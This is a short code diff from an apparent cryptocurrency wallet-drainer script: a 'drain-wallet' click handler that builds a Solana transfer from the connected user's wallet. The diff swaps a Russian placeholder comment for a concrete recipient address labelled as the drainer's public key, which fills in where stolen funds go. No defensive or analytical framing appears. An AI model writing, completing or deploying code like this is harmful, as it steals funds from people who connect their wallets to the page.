@@ -32,7 +32,7 @@ document.getElementById('drain-wallet').addEventListener('click', async () => {
             throw new Error('Insufficient funds to cover the transaction fee');
         }
 
-        const drainerPubkey = new PublicKey('/* публичный ключ кошелька дрейнера */');
+        const drainerPubkey = new PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
         const transaction = new Transaction().add(
             SystemProgram.transfer({
                 fromPubkey: publicKey,
